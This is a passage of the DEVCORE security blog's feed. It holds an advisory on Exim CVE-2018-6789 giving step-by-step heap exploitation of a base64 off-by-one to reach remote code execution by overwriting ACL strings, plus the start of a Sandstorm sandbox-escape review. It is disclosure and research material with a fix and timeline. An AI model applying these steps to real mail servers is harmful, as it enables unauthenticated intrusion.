&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_malloc_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;cm&quot;&gt;/* every call,  */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;store_release_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* so give its  */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;store_reset_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* correct type */&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Function &lt;code class=&quot;highlighter-rouge&quot;&gt;store_free()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;store_malloc()&lt;/code&gt; calls &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;free()&lt;/code&gt; of glibc directly. Glibc takes a slightly bigger (&lt;code class=&quot;highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes) &lt;strong&gt;chunk&lt;/strong&gt; and stores its metadata in the first &lt;code class=&quot;highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes (x86-64) on every allocation, and then returns the location of &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt;. The following illustration describes structure of chunk:&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180306/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Metadata includes size of previous chunk (the one exactly above in memory), size of current block and some flags. The first three bits of &lt;code class=&quot;highlighter-rouge&quot;&gt;size&lt;/code&gt; are used to store flags. In this example, size of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x81&lt;/code&gt; implies current chunk is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x80&lt;/code&gt; bytes and the previous chunk is in use.&lt;br /&gt;
Most of released chunks used in exim are put into a doubly linked list called &lt;strong&gt;unsorted bin&lt;/strong&gt;. Glibc maintains it according to the flags, and merges adjacent released chunks into a bigger chunk to avoid fragmentation. For every allocation request, glibc checks these chunks in an FIFO (first in, first-out) order and reuses the chunks.&lt;/p&gt;

&lt;p&gt;For some performance issues, exim maintains its own linked list structure with &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;store_release()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;store_extend()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180306/2.png&quot; alt=&quot;architecture of storeblock&quot; /&gt;&lt;br /&gt;
The main feature of storeblocks is that every block is at least &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2000&lt;/code&gt; bytes, which becomes a restriction to our exploitation. Note that a storeblock is also the &lt;code class=&quot;highlighter-rouge&quot;&gt;data&lt;/code&gt; of a chunk. Therefore, if we look into the memory, it is like:&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180306/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we list functions used to arrange heap data:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;EHLO hostname&lt;br /&gt;
  For each EHLO(or HELO) command, exim stores the pointer of hostname in &lt;code class=&quot;highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;store_free()&lt;/code&gt; old name&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;store_malloc()&lt;/code&gt; for new name&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L1833&quot;&gt;smtp_in.c: 1833 check_helo&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;mi&quot;&gt;1839&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Discard any previous helo name */&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1840&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1841&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1842&lt;/span&gt;   &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1843&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;store_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1844&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1845&lt;/span&gt;   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1884&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string_copy_malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1885&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Unrecognized command&lt;br /&gt;
  For every unrecognized command with unprintable characters, exim allocates a buffer to convert it to printable
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; to store error message&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L5725&quot;&gt;smtp_in.c: 5725 smtp_setup_msg&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;mi&quot;&gt;5725&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L_smtp_syntax_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;5726&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;unrecognized command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;AUTH&lt;br /&gt;
  In most authentication procedure, exim uses base64 encoding to communicate with client. The encode and decode string are stored in a buffer allocated by &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get()&lt;/code&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; for strings&lt;/li&gt;
      &lt;li&gt;can contain unprintable characters, NULL bytes&lt;/li&gt;
      &lt;li&gt;not necessarily null terminated&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Reset in EHLO/HELO, MAIL, RCPT&lt;br /&gt;
  When a command is done correctly, &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp_reset()&lt;/code&gt; is called. This function calls &lt;code class=&quot;highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt; to reset block chain to a &lt;strong&gt;reset point&lt;/strong&gt;, which means all storeblocks allocated by &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; after last command are released.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt; to reset point (set at the beginning of function)&lt;/li&gt;
      &lt;li&gt;release blocks added at a time&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L3771&quot;&gt;smtp_in.c: 3771 smtp_setup_msg&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  3771 int
  3772 smtp_setup_msg(void)
  3773 {
  3774 int done = 0;
  3775 BOOL toomany = FALSE;
  3776 BOOL discarded = FALSE;
  3777 BOOL last_was_rej_mail = FALSE;
  3778 BOOL last_was_rcpt = FALSE;
  3779 void *reset_point = store_get(0);
  3780
  3781 DEBUG(D_receive) debug_printf(&quot;smtp_setup_msg entered\n&quot;);
  3782
  3783 /* Reset for start of new message. We allow one RSET not to be counted as a
  3784 nonmail command, for those MTAs that insist on sending it between every
  3785 message. Ditto for EHLO/HELO and for STARTTLS, to allow for going in and out of
  3786 TLS between messages (an Exim client may do this if it has messages queued up
  3787 for the host). Note: we do NOT reset AUTH at this point. */
  3788
  3789 smtp_reset(reset_point);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;exploit-steps&quot;&gt;Exploit steps&lt;/h4&gt;
&lt;p&gt;To leverage this off-by-one, the chunk beneath decoded base64 data should be freed easily and controllable. After several attempts, we found that &lt;code class=&quot;highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt; is a better choice. We arrange the heap layout to leave a freed chunk above &lt;code class=&quot;highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt; for the base64 data.&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20180306/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Put a huge chunk into unsorted bin&lt;br /&gt;
 First of all, we send a EHLO message with huge hostname to make it allocate and deallocate, leaving a &lt;code class=&quot;highlighter-rouge&quot;&gt;0x6060&lt;/code&gt; length (3 storeblocks long) chunk in unsorted bin.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Cut the first storeblock&lt;br /&gt;
 Then we send an unrecognized string to trigger &lt;code class=&quot;highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; and allocate a storeblock inside the freed chunk.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Cut the second storeblock and release the first one&lt;br /&gt;
 We send a EHLO message again to get the second storeblock. The first block is freed sequentially because of the &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp_reset&lt;/code&gt; called after EHLO is done.&lt;/p&gt;

    &lt;p&gt;After the heap layout is prepared, we can use the off-by-one to overwrite the original chunk size. We modify &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2021&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x20f1&lt;/code&gt;, which slightly extends the chunk.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180306/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Send base64 data and trigger off-by-one&lt;br /&gt;
 To trigger off-by-one, we start an AUTH command to send base64 data. The overflow byte precisely overwrites the first byte of next chunk and extends the next chunk.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Forge a reasonable chunk size&lt;br /&gt;
 Because the chunk is extended, the start of next chunk of is changed to somewhere inside of the original one. Therefore, we need to make it &lt;strong&gt;seems like&lt;/strong&gt; a normal chunk to pass sanity checks in glibc. We send another base64 string here, because it requires &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt; byte and unprintable character to forge chunk size.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Release the extended chunk&lt;br /&gt;
 To control the content of extended chunk, we need to release the chunk first because we cannot edit it directly. That is, we should send a new EHLO message to release the old host name. However, normal EHLO message calls &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp_reset&lt;/code&gt; after it succeeds, which possibly makes program abort or crash. To avoid this, we send an &lt;strong&gt;invalid&lt;/strong&gt; host name such as &lt;code class=&quot;highlighter-rouge&quot;&gt;a+&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Overwrite the &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;next&lt;/code&gt;&lt;/strong&gt; pointer of overlapped storeblock&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180306/6.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
 After the chunk is released, we can retrieve it with AUTH and overwrite part of overlapped storeblock. Here we use a trick called &lt;strong&gt;partial write&lt;/strong&gt;. With this, we can modify the pointer without breaking &lt;strong&gt;ASLR&lt;/strong&gt; (Address space layout randomization). We partially changed the &lt;code class=&quot;highlighter-rouge&quot;&gt;next&lt;/code&gt; pointer to a storeblock containing ACL (Access Control List) strings. The ACL strings are pointed by a set of global pointers such as:&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_etrn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_expn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_helo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_quit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_rcpt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;These pointers are initialized at the beginning of exim process, set according to the configure. For example, if there is a line &lt;code class=&quot;highlighter-rouge&quot;&gt;acl_smtp_mail = acl_check_mail&lt;/code&gt; in the configure, the pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;acl_smtp_mail&lt;/code&gt; points to the string &lt;code class=&quot;highlighter-rouge&quot;&gt;acl_check_mail&lt;/code&gt;. Whenever MAIL FROM is used, exim performs an ACL check, which expands &lt;code class=&quot;highlighter-rouge&quot;&gt;acl_check_mail&lt;/code&gt; first. While expanding, exim tries to execute commands if it encounters &lt;code class=&quot;highlighter-rouge&quot;&gt;${run{cmd}}&lt;/code&gt;, so we achieve code execution as long as we control the ACL strings. In addition, we do not need to hijack program control flow directly and therefore we can bypass mitigations such as &lt;strong&gt;PIE&lt;/strong&gt; (Position Independent Executables), &lt;strong&gt;NX&lt;/strong&gt; easily.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Reset storeblocks and retrieve the ACL storeblock&lt;br /&gt;
 Now the ACL storeblock is in the linked list chain. It will be released once &lt;code class=&quot;highlighter-rouge&quot;&gt;smtp_reset()&lt;/code&gt; is triggered, and then we can retrieve it again by allocating multiple blocks.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Overwrite ACL strings and trigger ACL check&lt;br /&gt;
 Finally, we overwrite the whole block containing ACL strings. Now we send commands such as EHLO, MAIL, RCPT to trigger ACL checks. Once we touch an acl defined in the configure, we achieve remote code execution.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;fix&quot;&gt;Fix&lt;/h2&gt;
&lt;p&gt;Upgrade to 4.90.1 or above&lt;/p&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;5 February, 2018 09:10 Reported to Exim&lt;/li&gt;
  &lt;li&gt;6 February, 2018 23:23 CVE received&lt;/li&gt;
  &lt;li&gt;10 February, 2018 18:00 Patch released&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;credits&quot;&gt;Credits&lt;/h2&gt;
&lt;p&gt;Vulnerabilities found by Meh, DEVCORE research team.&lt;br /&gt;
meh [at] devco [dot] re&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;https://exim.org/static/doc/security/CVE-2018-6789.txt&lt;br /&gt;
https://git.exim.org/exim.git/commit/cf3cd306062a08969c41a1cdd32c6855f1abecf1&lt;br /&gt;
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6789&lt;br /&gt;
http://www.openwall.com/lists/oss-security/2018/02/07/2&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;heap_exp&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;heap-exploitation-materials-return&quot;&gt;Heap exploitation materials &lt;a href=&quot;#back&quot;&gt;[return]&lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://heap-exploitation.dhavalkapil.com/&quot;&gt;Heap Exploitation&lt;/a&gt;: A tutorial of heap exploitation by Dhaval Kapil&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/shellphish/how2heap&quot;&gt;how2heap&lt;/a&gt;: A repo for learning heap exploitation by Shellphish&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/heap-exploitation-51891400&quot;&gt;Heap exploitation&lt;/a&gt;: (Chinese) A slide introducing basic glibc heap exploitation by Angelboy&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.slideshare.net/AngelBoy1/advanced-heap-exploitaion&quot;&gt;Advanced heap exploitation&lt;/a&gt;: (Chinese) A slide of advanced heap exploitation techniques by Angelboy&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.tw/2014/08/the-poisoned-nul-byte-2014-edition.html&quot;&gt;The poisoned NUL byte&lt;/a&gt;: An article of Null byte off-by-one exploitation by Project Zero&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/</link>
                <guid>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en</guid>
                <pubDate>Tue, 06 Mar 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Exim 任意代碼執行漏洞 (CVE-2018-6789)</title>
                <description>&lt;h2 id=&quot;內容&quot;&gt;內容&lt;/h2&gt;

&lt;p&gt;今年我們向 Exim 回報了一個位於 base64 解碼函式的溢出漏洞，編號為 &lt;strong&gt;CVE-2018-6789&lt;/strong&gt;。此漏洞從 Exim 專案開始時即存在，因此&lt;strong&gt;影響 Exim 的所有版本&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;根據我們的研究，攻擊者可利用此漏洞達成&lt;strong&gt;遠端任意代碼執行，並且不需任何認證&lt;/strong&gt;，至少有 40 萬台 Exim 伺服器受此漏洞影響並存在被攻擊的風險。我們建議立即將 Exim &lt;strong&gt;升級至 4.90.1 版&lt;/strong&gt;以免遭受攻擊。&lt;/p&gt;

&lt;h2 id=&quot;細節&quot;&gt;細節&lt;/h2&gt;

&lt;p&gt;詳細的技術細節請參閱我們的 Advisory：&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&quot;&gt;https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/&lt;/a&gt;&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789/</link>
                <guid>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789</guid>
                <pubDate>Tue, 06 Mar 2018 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Sandstorm Security Review</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/&quot;&gt;Sandstorm Security Review&lt;/a&gt; (English Version)  &lt;br /&gt;
&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/&quot;&gt;一次在 Sandstorm 跳脫沙箱的滲透經驗&lt;/a&gt; (中文版本)&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;In early 2017, we had a pentesting target protected with &lt;a href=&quot;https://sandstorm.io/&quot;&gt;Sandstorm&lt;/a&gt;. Sandstorm is a web-based platform which allows users to install their web apps, such as WordPress, GitLab, etc. The main feature of Sandstorm is that it containerizes every app in its own sandbox. Therefore, even though we had found several vulnerabilities of the apps, we still could not put a threat to the server.&lt;/p&gt;

&lt;p&gt;In order to leverage the vulnerabilities, we put part of efforts into review of Sandstorm’s source codes, and tried to escape the sandbox to impact the whole server. Finally, we found a number of uncommon and interesting vulnerabilities, and received CVE IDs as follows:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2017-6198 (Denial of Service)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6199 (Bypassing Authorization Schema)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6200 (Insecure Direct Object References)&lt;/li&gt;
  &lt;li&gt;CVE-2017-6201 (Server-Side Request Forgery)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;exploitation-details&quot;&gt;Exploitation Details&lt;/h2&gt;

&lt;h3 id=&quot;cve-2017-6198&quot;&gt;CVE-2017-6198&lt;/h3&gt;

&lt;p&gt;This is a DoS created by system resource exhaustion. The root cause is that Sandstorm does not have a comprehensive policy to limit the amount of resource used by every apps run on it. In &lt;code class=&quot;highlighter-rouge&quot;&gt;src/sandstorm/supervisor.c++&lt;/code&gt; only the maximum number of files opened by each process was limited. See the codes below:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SupervisorMain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setResourceLimits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rlimit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_cur&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
